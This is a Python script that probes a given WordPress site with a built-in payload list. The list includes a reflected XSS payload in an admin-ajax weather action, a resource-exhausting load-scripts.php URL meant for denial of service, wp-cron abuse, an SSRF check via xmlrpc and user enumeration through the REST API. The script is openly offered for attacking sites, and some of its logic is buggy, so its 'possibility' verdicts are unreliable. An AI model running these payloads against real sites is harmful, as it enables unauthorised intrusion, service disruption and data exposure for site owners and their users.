import requests
import argparse
import urllib3
import urllib
import threading
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', type=str,
                    help='Wordpress Domain https://example.com/', required=True)
args = parser.parse_args()
payload_List = ['/xmlrpc.php?rsd', '/wp-content/uploads', '/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter', '/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D', '/wp-cron.php', '/wp-json/wp/v2/users/']

burp_Proxy = {"http": "http://127.0.0.1:8080", "https":  "http://127.0.0.1:8080"}

def exploit_Wordpress(url):
    checkSlash = re.search("^https?://\w+.*.com/", url)
    req = requests.Session()
    if checkSlash:
        URL_without_slash = url[:-1]
        for i in range(len(payload_List)):
            exploit_URL = URL_without_slash + payload_List[i]
            if i == 0:
                res = req.get(exploit_URL, verify=True)
                if res.status_code == 200:
                    print(f'URL : {exploit_URL} [Possibility for SSRF] ')
                else:
                    print(f'URL : {exploit_URL} [No Possibility of SSRF] ')
            if i == 1:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200:
                    print(f'URL : {exploit_URL} [Have Directory List] ')
                else:
                    print(f"URL : {exploit_URL} [Don't Have Directory List] ")
            if i == 2:
                res = req.get(exploit_URL, verify=False)
                shorted_URL = exploit_URL.split(',')
                if res.status_code == 200:
                    print(
                        f'URL : {shorted_URL[0]} [Possibility for DDOS] And recive Full payload at https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9 ')
                else:
                    print(f'URL : {shorted_URL[0]} [No Possibility for DDOS] ')
            if i == 3:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200:
                    print(f'URL : {exploit_URL} [Possibility for XSS] ')
                else:
                    print(f"URL : {exploit_URL} [No Possibility for XSS] ")

            if i == 4:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200:
                    print(f'URL : {exploit_URL} [Possibility for DDOS] ')
                else:
                    print(f"URL : {exploit_URL} [No Possibility for DDOS] ")
            if i == 5:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200 and res.header['Content-Type'] == 'application/json':
                    print(
                        f'URL : {exploit_URL} [Possibility for User Enumeration] ')
                else:
                    print(
                        f"URL : {exploit_URL} [No Possibility for User Enumeration] ")
    else:
        for i in range(len(payload_List)):
            exploit_URL = url + payload_List[i]
            if i == 0:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200:
                    print(f'URL : {exploit_URL} [Possibility for SSRF] ')
                else:
                    print(f'URL : {exploit_URL} [No Possibility of SSRF] ')
            if i == 1:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200:
                    print(f'URL : {exploit_URL} [Have Directory List] ')
                else:
                    print(f"URL : {exploit_URL} [Don't Have Directory List] ")
            if i == 2:
                res = req.get(exploit_URL, verify=False)
                if res.headers['Content-Length'] == '776584' and res.status_code == 200:
                    shorted_URL = exploit_URL.split(',')
                    print(
                        f'URL : {shorted_URL[0]} [Possibility for DDOS] And recive Full payload at https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9 ')
                else:
                    print(f'URL : {shorted_URL[0]} [No Possibility for DDOS] ')
            if i == 3:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200:
                    print(f'URL : {exploit_URL} [Possibility for XSS] ')
                else:
                    print(f"URL : {exploit_URL} [No Possibility for XSS] ")

            if i == 4:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200:
                    print(f'URL : {exploit_URL} [Possibility for DDOS] ')
                else:
                    print(f"URL : {exploit_URL} [No Possibility for DDOS] ")
            if i == 5:
                res = req.get(exploit_URL, verify=False)
                if res.status_code == 200 and res.header['Content-Type'] == 'application/json':
                    print(
                        f'URL : {exploit_URL} [Possibility for User Enumeration] ')
                else:
                    print(
                        f"URL : {exploit_URL} [No Possibility for User Enumeration] ")


url = args.url
exploit_Wordpress(url)


"""
Payload

- /xmlrpc.php?rsd
- /wp-content/uploads
- /wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
- /wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
- /wp-cron.php
- /wp-json/wp/v2/users/

"""
